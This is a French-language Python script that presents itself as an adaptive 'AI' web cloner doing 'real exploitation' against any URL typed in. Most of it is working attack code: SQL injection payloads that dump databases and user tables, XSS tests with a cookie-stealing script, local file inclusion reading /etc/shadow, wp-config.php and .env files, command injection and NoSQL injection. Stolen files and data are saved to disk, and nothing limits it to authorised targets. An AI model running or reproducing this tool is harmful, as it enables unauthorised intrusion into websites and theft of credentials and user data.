#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
WEB CLONER ULTIME - JATHNIEL EDITION v4.1
✅ IA ADAPTATIVE AVEC EXPLOITATION RÉELLE
✅ SANS INSTALLATION EXTERNE
✅ 100% PYTHON PUR
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import time
import os
import re
import json
import hashlib
import sqlite3
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, quote
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
import datetime
import random
import base64
import binascii

# ==================== COULEURS ====================

COLORS = {
    'bg': '#0a0e17',
    'bg2': '#0d1117',
    'fg': '#00ff41',
    'fg2': '#008f11',
    'error': '#ff0040',
    'warning': '#ffd700',
    'success': '#00ff41',
    'text': '#c9d1d9',
    'ai': '#00aaff'
}

# ==================== IA AVEC EXPLOITATION RÉELLE ====================

class AdaptiveAI:
    def __init__(self, log_callback):
        self.log = log_callback
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        self.knowledge = self._load_knowledge()
        self.successful_attacks = []
        self.failed_attacks = []
        self.learning_rate = 0.3
        self.exploration_rate = 0.2
        
        self.log("🧠 IA Initialisée avec exploitation réelle")
    
    def _load_knowledge(self):
        try:
            if os.path.exists('ai_knowledge.pkl'):
                import pickle
                with open('ai_knowledge.pkl', 'rb') as f:
                    return pickle.load(f)
        except:
            pass
        return {}
    
    def _save_knowledge(self):
        try:
            import pickle
            with open('ai_knowledge.pkl', 'wb') as f:
                pickle.dump(self.knowledge, f)
        except:
            pass
    
    # ==================== SQL INJECTION - EXPLOITATION RÉELLE ====================
    
    def exploit_sql_injection(self, url: str, param: str) -> Dict:
        """Exploitation SQL Injection réelle"""
        self.log(f"💥 IA: Exploitation SQL Injection sur {param}")
        
        result = {
            'vulnerable': False,
            'database': None,
            'tables': [],
            'columns': {},
            'data': [],
            'error': None
        }
        
        # 1. Détection de la vulnérabilité
        detection_payloads = [
            "' OR '1'='1",
            "' AND 1=1--",
            "' AND 1=0--",
            "' UNION SELECT NULL--"
        ]
        
        vulnerable = False
        for payload in detection_payloads:
            test_url = self._build_test_url(url, param, payload)
            try:
                response = self.session.get(test_url, timeout=10)
                if self._detect_sql_error(response.text):
                    vulnerable = True
                    break
            except:
                continue
        
        if not vulnerable:
            # Test time-based
            for payload in ["' AND SLEEP(5)--", "' OR SLEEP(5)--"]:
                test_url = self._build_test_url(url, param, payload)
                try:
                    start = time.time()
                    response = self.session.get(test_url, timeout=15)
                    elapsed = time.time() - start
                    if elapsed > 4:
                        vulnerable = True
                        break
                except:
                    continue
        
        if not vulnerable:
            result['error'] = "Non vulnérable"
            return result
        
        result['vulnerable'] = True
        
        # 2. Extraire la base de données
        db_payloads = [
            "' UNION SELECT database(),user()--",
            "' UNION SELECT DATABASE(),USER()--",
            "' UNION SELECT schema_name,schema_owner FROM information_schema.schemata--"
        ]
        
        for payload in db_payloads:
            test_url = self._build_test_url(url, param, payload)
            try:
                response = self.session.get(test_url, timeout=10)
                match = re.search(r'([a-zA-Z0-9_]+)\s+([a-zA-Z0-9_]+)', response.text)
                if match:
                    result['database'] = match.group(1)
                    self.log(f"📊 Base de données: {result['database']}")
                    break
            except:
                continue
        
        # 3. Extraire les tables
        table_payloads = [
            "' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database()--",
            "' UNION SELECT TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS--"
        ]
        
        for payload in table_payloads:
            test_url = self._build_test_url(url, param, payload)
            try:
                response = self.session.get(test_url, timeout=10)
                tables = re.findall(r'([a-zA-Z0-9_]+)\s+([a-zA-Z0-9_]+)', response.text)
                for table_name, table_schema in tables:
                    if table_name not in ['information_schema', 'mysql', 'performance_schema']:
                        if table_name not in result['tables']:
                            result['tables'].append(table_name)
                if result['tables']:
                    self.log(f"📊 Tables trouvées: {len(result['tables'])}")
                    break
            except:
                continue
        
        # 4. Extraire les colonnes
        for table in result['tables'][:5]:
            col_payload = f"' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='{table}'--"
            test_url = self._build_test_url(url, param, col_payload)
            try:
                response = self.session.get(test_url, timeout=10)
                columns = re.findall(r'([a-zA-Z0-9_]+)\s+([a-zA-Z0-9_]+)', response.text)
                result['columns'][table] = [c[0] for c in columns if len(c[0]) > 2][:10]
            except:
                continue
        
        # 5. Extraire les données sensibles
        sensitive_tables = ['users', 'user', 'admin', 'administrator', 'members']
        for table in result['tables']:
            if table.lower() in sensitive_tables:
                columns = result['columns'].get(table, [])
                if columns:
                    select_cols = ','.join(columns[:5])
                    data_payload = f"' UNION SELECT {select_cols} FROM {table}--"
                    test_url = self._build_test_url(url, param, data_payload)
                    try:
                        response = self.session.get(test_url, timeout=10)
                        lines = response.text.split('\n')
                        for line in lines:
                            if '|' in line or '\t' in line:
                                result['data'].append(line.strip())
                        if result['data']:
                            self.log(f"📊 Données extraites de {table}: {len(result['data'])} lignes")
                    except:
                        continue
        
        return result
    
    # ==================== XSS - EXPLOITATION RÉELLE ====================
    
    def exploit_xss(self, url: str, param: str) -> Dict:
        """Exploitation XSS réelle"""
        self.log(f"💥 IA: Exploitation XSS sur {param}")
        
        result = {
            'vulnerable': False,
            'payloads': [],
            'reflected': [],
            'captured': []
        }
        
        # 1. Test XSS réfléchi
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'\"><script>alert('XSS')</script>",
            "<body onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            test_url = self._build_test_url(url, param, payload)
            try:
                response = self.session.get(test_url, timeout=10)
                if payload in response.text:
                    result['vulnerable'] = True
                    result['reflected'].append({
                        'payload': payload,
                        'reflected': True
                    })
                    self.log(f"💥 XSS réfléchie trouvée sur {param}")
                    break
            except:
                continue
        
        # 2. Test XSS stocké (si formulaire)
        if result['vulnerable']:
            # 2.1 Injection de script de capture
            capture_payload = """
            <script>
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'http://localhost:8080/capture', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                cookie: document.cookie,
                url: window.location.href,
                userAgent: navigator.userAgent
            }));
            </script>
            """
            result['payloads'].append(capture_payload)
        
        return result
    
    # ==================== LFI - EXPLOITATION RÉELLE ====================
    
    def exploit_lfi(self, url: str, param: str) -> Dict:
        """Exploitation LFI réelle"""
        self.log(f"💥 IA: Exploitation LFI sur {param}")
        
        result = {
            'vulnerable': False,
            'files': [],
            'contents': {}
        }
        
        test_files = [
            '/etc/passwd',
            '/etc/hosts',
            'C:\\Windows\\win.ini',
            '/var/log/apache2/access.log',
            '/proc/self/environ',
            '../../../../etc/passwd',
            '../../../../windows/win.ini',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd'
        ]
        
        for file_path in test_files:
            test_url = self._build_test_url(url, param, file_path)
            try:
                response = self.session.get(test_url, timeout=10)
                
                if 'root:x:0:0' in response.text:
                    result['vulnerable'] = True
                    result['files'].append('/etc/passwd')
                    result['contents']['/etc/passwd'] = response.text
                    self.log(f"💥 LFI: /etc/passwd accessible")
                    break
                elif 'Windows Registry Editor' in response.text:
                    result['vulnerable'] = True
                    result['files'].append('win.ini')
                    result['contents']['win.ini'] = response.text
                    self.log(f"💥 LFI: win.ini accessible")
                    break
                elif '127.0.0.1' in response.text and 'localhost' in response.text:
                    result['vulnerable'] = True
                    result['files'].append('/etc/hosts')
                    result['contents']['/etc/hosts'] = response.text
                    self.log(f"💥 LFI: /etc/hosts accessible")
                    break
            except:
                continue
        
        # Si vulnérable, essayer de lire les fichiers importants
        if result['vulnerable']:
            additional_files = [
                '/var/www/html/config.php',
                '/var/www/html/wp-config.php',
                '/var/www/html/.env',
                '/etc/shadow',
                '/etc/group',
                '/var/log/nginx/access.log',
                '/var/log/apache2/error.log'
            ]
            for file_path in additional_files:
                test_url = self._build_test_url(url, param, file_path)
                try:
                    response = self.session.get(test_url, timeout=10)
                    if response.status_code == 200 and len(response.text) > 100:
                        result['files'].append(file_path)
                        result['contents'][file_path] = response.text[:1000]
                        self.log(f"💥 LFI: {file_path} accessible")
                except:
                    continue
        
        return result
    
    # ==================== COMMAND INJECTION - EXPLOITATION RÉELLE ====================
    
    def exploit_command_injection(self, url: str, param: str) -> Dict:
        """Exploitation Command Injection réelle"""
        self.log(f"💥 IA: Exploitation Command Injection sur {param}")
        
        result = {
            'vulnerable': False,
            'commands': [],
            'outputs': {}
        }
        
        # 1. Test de base
        test_commands = [
            '; whoami',
            '| whoami',
            '; id',
            '| id',
            '; uname -a',
            '| uname -a',
            '; ls',
            '| ls',
            '; dir',
            '| dir'
        ]
        
        for cmd in test_commands:
            test_url = self._build_test_url(url, param, cmd)
            try:
                response = self.session.get(test_url, timeout=10)
                if 'uid=' in response.text or 'gid=' in response.text:
                    result['vulnerable'] = True
                    result['commands'].append(cmd)
                    result['outputs'][cmd] = response.text[:500]
                    self.log(f"💥 Command Injection: {cmd} exécuté")
                    break
                elif 'root' in response.text.lower():
                    result['vulnerable'] = True
                    result['commands'].append(cmd)
                    result['outputs'][cmd] = response.text[:500]
                    break
            except:
                continue
        
        # 2. Si vulnérable, tenter des commandes plus avancées
        if result['vulnerable']:
            advanced_commands = [
                '; cat /etc/passwd',
                '| cat /etc/passwd',
                '; type C:\\Windows\\win.ini',
                '| type C:\\Windows\\win.ini',
                '; uname -a',
                '| uname -a',
                '; echo "test"',
                '| echo "test"'
            ]
            for cmd in advanced_commands:
                test_url = self._build_test_url(url, param, cmd)
                try:
                    response = self.session.get(test_url, timeout=10)
                    if len(response.text) > 100:
                        result['commands'].append(cmd)
                        result['outputs'][cmd] = response.text[:500]
                        self.log(f"💥 Command Injection: {cmd} exécuté")
                except:
                    continue
        
        return result
    
    # ==================== NOSQL INJECTION - EXPLOITATION RÉELLE ====================
    
    def exploit_nosql_injection(self, url: str, param: str) -> Dict:
        """Exploitation NoSQL Injection réelle"""
        self.log(f"💥 IA: Exploitation NoSQL Injection sur {param}")
        
        result = {
            'vulnerable': False,
            'payloads': [],
            'data': []
        }
        
        # 1. Test des opérateurs NoSQL
        nosql_payloads = [
            "{'$ne': ''}",
            "{'$or': [{}, {'password': {'$regex': '.*'}}]}",
            "{'$where': 'return true'}",
            "{'$gt': ''}",
            "{'$exists': true}",
            "{'$regex': '.*'}"
        ]
        
        for payload in nosql_payloads:
            test_url = self._build_test_url(url, param, payload)
            try:
                response = self.session.get(test_url, timeout=10)
                if '$ne' in response.text or '$or' in response.text:
                    result['vulnerable'] = True
                    result['payloads'].append(payload)
                    self.log(f"💥 NoSQL Injection: {payload} fonctionne")
                    break
            except:
                continue
        
        # 2. Extraction de données si vulnérable
        if result['vulnerable']:
            # Tenter d'extraire des données
            extract_payloads = [
                "{'$where': 'return true'}",
                "{'$regex': '.*'}",
                "{'$gt': ''}"
            ]
            for payload in extract_payloads:
                test_url = self._build_test_url(url, param, payload)
                try:
                    response = self.session.get(test_url, timeout=10)
                    if len(response.text) > 500:
                        result['data'].append({
                            'payload': payload,
                            'response': response.text[:500]
                        })
                except:
                    continue
        
        return result
    
    # ==================== UTILITAIRES ====================
    
    def _build_test_url(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if param in params:
            params[param] = [payload]
        else:
            params[param] = [payload]
        new_query = '&'.join([f"{k}={v[0]}" for k, v in params.items()])
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def _detect_sql_error(self, text: str) -> bool:
        sql_errors = [
            'sql syntax', 'mysql', 'postgresql', 'ora-',
            'information_schema', 'warning.*mysql', 'unclosed quotation',
            'jdbc', 'odbc', 'db2', 'sqlite', 'microsoft ole db',
            'you have an error', 'sqlstate', 'sql server'
        ]
        for error in sql_errors:
            if re.search(error, text, re.IGNORECASE):
                return True
        return False
    
    def analyze_target(self, url: str, html: str, headers: dict) -> Dict:
        """Analyse la cible"""
        profile = {
            'url': url,
            'technologies': self._detect_technologies(html, headers),
            'parameters': self._extract_parameters(url, html),
            'vulnerability_score': 0,
            'recommended_attacks': []
        }
        
        # Score
        score = 0.0
        if 'PHP' in profile['technologies'] or 'WordPress' in profile['technologies']:
            score += 0.3
        if len(profile['parameters']) > 0:
            score += 0.3
        score += min(0.4, len(profile['parameters']) * 0.05)
        profile['vulnerability_score'] = min(1.0, score)
        
        # Recommandations
        if score > 0.3:
            profile['recommended_attacks'] = self._recommend_attacks(profile)
        
        return profile
    
    def _detect_technologies(self, html: str, headers: dict) -> List[str]:
        techs = []
        tech_patterns = {
            'WordPress': ['wp-content', 'wp-includes'],
            'Laravel': ['laravel', 'csrf-token'],
            'Django': ['django', 'csrfmiddlewaretoken'],
            'Rails': ['rails', 'authenticity_token'],
            'React': ['react', 'react-dom'],
            'Vue': ['vue.js', 'v-bind'],
            'PHP': ['.php', '?php'],
            'Python': ['.py', '?py'],
            'Node.js': ['node', 'express'],
            'Nginx': ['nginx'],
            'Apache': ['apache'],
            'Cloudflare': ['cf-ray', '__cfduid']
        }
        for tech, patterns in tech_patterns.items():
            for pattern in patterns:
                if pattern in html.lower() or pattern in str(headers).lower():
                    techs.append(tech)
                    break
        return list(set(techs))
    
    def _extract_parameters(self, url: str, html: str) -> List[Dict]:
        params = []
        parsed = urlparse(url)
        url_params = parse_qs(parsed.query)
        for key, values in url_params.items():
            params.append({'name': key, 'value': values[0] if values else ''})
        return params
    
    def _recommend_attacks(self, profile: Dict) -> List[Dict]:
        recommendations = []
        techs = profile['technologies']
        
        if any(t in techs for t in ['PHP', 'WordPress', 'Django', 'Rails']):
            recommendations.append({
                'attack': 'sql_injection',
                'score': 0.8,
                'reason': 'Technologie vulnérable'
            })
        if profile['parameters']:
            recommendations.append({
                'attack': 'xss',
                'score': 0.7,
                'reason': 'Paramètres détectés'
            })
        if 'PHP' in techs:
            recommendations.append({
                'attack': 'lfi',
                'score': 0.6,
                'reason': 'PHP détecté'
            })
        if any(p['name'] in ['cmd', 'exec', 'system'] for p in profile['parameters']):
            recommendations.append({
                'attack': 'command_injection',
                'score': 0.8,
                'reason': 'Paramètres système détectés'
            })
        if 'Node.js' in techs:
            recommendations.append({
                'attack': 'nosql_injection',
                'score': 0.6,
                'reason': 'Node.js détecté'
            })
        
        recommendations.sort(key=lambda x: x['score'], reverse=True)
        return recommendations
    
    def execute_attack(self, attack_type: str, url: str, param: str) -> Dict:
        """Exécute une attaque"""
        self.log(f"🧠 IA: Exécution de {attack_type}")
        
        if attack_type == 'sql_injection':
            result = self.exploit_sql_injection(url, param)
        elif attack_type == 'xss':
            result = self.exploit_xss(url, param)
        elif attack_type == 'lfi':
            result = self.exploit_lfi(url, param)
        elif attack_type == 'command_injection':
            result = self.exploit_command_injection(url, param)
        elif attack_type == 'nosql_injection':
            result = self.exploit_nosql_injection(url, param)
        else:
            result = {'error': 'Attaque inconnue'}
        
        return result

# ==================== CLONEUR AVEC IA ====================

class WebClonerAI:
    def __init__(self, url: str, log_callback, update_stats_callback, output_dir: Path):
        self.url = url
        self.domain = urlparse(url).netloc
        self.log = log_callback
        self.update_stats = update_stats_callback
        self.output_dir = output_dir
        
        self.ai = AdaptiveAI(log_callback)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        self.visited = set()
        self.queue = [(url, 0)]
        self.results = {
            'pages': [],
            'vulnerabilities': [],
            'technologies': [],
            'extracted_data': {}
        }
        
        self.running = False
        self.pages_crawled = 0
        
        for subdir in ['pages', 'sensitive', 'assets', 'exploits']:
            (output_dir / subdir).mkdir(parents=True, exist_ok=True)
    
    def start(self):
        self.running = True
        self.log("🧠 Web Cloner IA - Exploitation réelle")
        self.log(f"🎯 Cible: {self.url}")
        
        # 1. Analyse
        response = self.session.get(self.url, timeout=10)
        html = response.text
        profile = self.ai.analyze_target(self.url, html, response.headers)
        self.results['technologies'] = profile['technologies']
        
        # 2. Attaques
        for rec in profile['recommended_attacks']:
            if not self.running:
                break
            
            attack_type = rec['attack']
            self.log(f"🧠 IA: Test de {attack_type} (score: {rec['score']:.2f})")
            
            # Récupérer les paramètres
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                if not self.running:
                    break
                result = self.ai.execute_attack(attack_type, self.url, param)
                if result.get('vulnerable', False):
                    self.results['vulnerabilities'].append({
                        'type': attack_type,
                        'param': param,
                        'details': result
                    })
                    self.log(f"💥 IA: {attack_type} trouvée sur {param}")
                    
                    # Sauvegarder les données extraites
                    if attack_type == 'sql_injection':
                        if result.get('database'):
                            self.results['extracted_data']['database'] = result['database']
                        if result.get('tables'):
                            self.results['extracted_data']['tables'] = result['tables']
                        if result.get('data'):
                            self.results['extracted_data']['data'] = result['data']
                    
                    elif attack_type == 'lfi':
                        if result.get('files'):
                            # Sauvegarder les fichiers
                            for file_path, content in result.get('contents', {}).items():
                                filename = file_path.replace('/', '_').replace('\\', '_')
                                filepath = self.output_dir / 'sensitive' / filename
                                with open(filepath, 'w', encoding='utf-8') as f:
                                    f.write(content)
                                self.log(f"📁 Fichier LFI sauvegardé: {filename}")
        
        # 3. Crawl
        self.log("🔄 Crawl standard...")
        with ThreadPoolExecutor(max_workers=5) as executor:
            while self.queue and len(self.visited) < 100:
                if not self.running:
                    break
                url, depth = self.queue.pop(0)
                if url in self.visited:
                    continue
                self.visited.add(url)
                executor.submit(self.process_page, url, depth)
                time.sleep(0.3)
        
        self.log("✅ Terminé!")
        self.generate_report()
        self.update_stats()
    
    def process_page(self, url, depth):
        try:
            response = self.session.get(url, timeout=10)
            if response.status_code != 200:
                return
            
            html = response.text
            self.pages_crawled += 1
            self.log(f"📄 {self.pages_crawled}: {url}")
            
            filename = hashlib.md5(url.encode()).hexdigest()[:12] + '.html'
            filepath = self.output_dir / 'pages' / filename
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(html)
            
            if depth < 3:
                soup = BeautifulSoup(html, 'html.parser')
                for a in soup.find_all('a', href=True):
                    href = a['href']
                    if href and not href.startswith('#') and not href.startswith('javascript:'):
                        absolute_url = urljoin(url, href)
                        if self.domain in absolute_url and absolute_url not in self.visited:
                            self.queue.append((absolute_url, depth + 1))
            
            self.update_stats()
        except Exception as e:
            self.log(f"❌ Erreur {url}: {e}")
    
    def generate_report(self):
        stats = {
            'pages': len(self.visited),
            'vulnerabilities': len(self.results['vulnerabilities']),
            'technologies': len(self.results['technologies'])
        }
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Web Cloner IA - Rapport</title>
            <style>
                body {{ font-family: Arial; background: #0a0e17; color: #00ff41; padding: 20px; }}
                .container {{ max-width: 1200px; margin: 0 auto; }}
                .header {{ border: 1px solid #00ff41; padding: 20px; }}
                .stats {{ display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin: 20px 0; }}
                .stat {{ border: 1px solid #00ff41; padding: 15px; text-align: center; }}
                .stat .number {{ font-size: 24px; font-weight: bold; }}
                .vuln {{ border-left: 4px solid #ff0040; padding: 15px; margin: 10px 0; background: #0d1117; }}
                .tech {{ display: inline-block; background: #0d1117; border: 1px solid #00ff41; padding: 5px 10px; margin: 3px; border-radius: 4px; }}
                pre {{ background: #0d1117; padding: 15px; overflow-x: auto; }}
                .footer {{ text-align: center; margin-top: 40px; color: #008f11; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🧠 Web Cloner IA - Rapport</h1>
                    <p>Cible: {self.url}</p>
                    <p>Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                    <p>JATHNIEL EDITION - IA Adaptative</p>
                </div>
                
                <div class="stats">
                    <div class="stat">
                        <div class="number">{stats['pages']}</div>
                        <div>Pages</div>
                    </div>
                    <div class="stat">
                        <div class="number">{stats['vulnerabilities']}</div>
                        <div>Vulnérabilités</div>
                    </div>
                    <div class="stat">
                        <div class="number">{stats['technologies']}</div>
                        <div>Technologies</div>
                    </div>
                </div>
                
                <h2>🔍 Technologies</h2>
                <div>
                    {''.join(f'<span class="tech">{tech}</span> ' for tech in self.results['technologies'])}
                </div>
                
                <h2>💥 Vulnérabilités</h2>
                {''.join(self._format_vulnerability(v) for v in self.results['vulnerabilities']) or "<p>Aucune vulnérabilité trouvée</p>"}
                
                <h2>📊 Données Extraites</h2>
                <pre>{json.dumps(self.results.get('extracted_data', {}), indent=2, ensure_ascii=False)}</pre>
                
                <div class="footer">
                    <p>Web Cloner IA - JATHNIEL EDITION</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        report_path = self.output_dir / 'ai_report.html'
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(html)
        self.log(f"📄 Rapport: {report_path}")
    
    def _format_vulnerability(self, vuln):
        return f"""
        <div class="vuln">
            <strong>{vuln['type'].upper()}</strong> sur {vuln['param']}<br>
            <details>
                <summary>Détails</summary>
                <pre>{json.dumps(vuln['details'], indent=2, ensure_ascii=False)[:500]}</pre>
            </details>
        </div>
        """
    
    def get_stats(self):
        return {
            'pages': len(self.visited),
            'vulnerabilities': len(self.results['vulnerabilities']),
            'technologies': len(self.results['technologies'])
        }

# ==================== MAIN ====================

if __name__ == "__main__":
    try:
        import requests
        from bs4 import BeautifulSoup
    except ImportError:
        print("❌ pip install requests beautifulsoup4")
        sys.exit(1)
    
    # Interface simplifiée
    url = input("🌐 URL cible: ").strip()
    if not url:
        url = "https://example.com"
    
    output_dir = Path("./cloned_site")
    output_dir.mkdir(exist_ok=True)
    
    def log(msg):
        print(f"[{time.strftime('%H:%M:%S')}] {msg}")
    
    cloner = WebClonerAI(url, log, lambda: None, output_dir)
    cloner.start()